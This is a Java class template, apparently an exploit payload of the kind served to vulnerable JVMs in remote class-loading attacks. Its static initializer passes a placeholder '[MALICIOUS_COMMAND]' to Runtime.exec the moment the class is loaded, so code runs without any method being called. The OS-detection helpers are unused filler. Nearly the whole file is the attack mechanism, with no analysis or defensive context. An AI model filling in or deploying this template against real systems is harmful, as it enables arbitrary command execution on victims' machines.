public class [CLASS_NAME] {
    public static String OS = System.getProperty("os.name").toLowerCase();

    public [CLASS_NAME]() {}
    static {
        try {
            String[] cmds = null;

            cmds = new String[]{[MALICIOUS_COMMAND]};

            java.lang.Runtime.getRuntime().exec(cmds).waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public static boolean isWindows() {
        return OS.contains("win");
    }

    public static boolean isMac() {
        return OS.contains("mac");
    }

    public static boolean isUnix() {
        return (OS.contains("nix") || OS.contains("nux") || OS.contains("aix"));
    }

    public static boolean isSolaris() {
        return OS.contains("sunos");
    }

    public static String getOS(){
        if (isWindows()) {
            return "win";
        } else if (isMac()) {
            return "osx";
        } else if (isUnix()) {
            return "unix";
        } else if (isSolaris()) {
            return "err";
        } else {
            return "err";
        }
    }

    public static void main(String[] args) {
        [CLASS_NAME] e = new [CLASS_NAME]();
    }
}
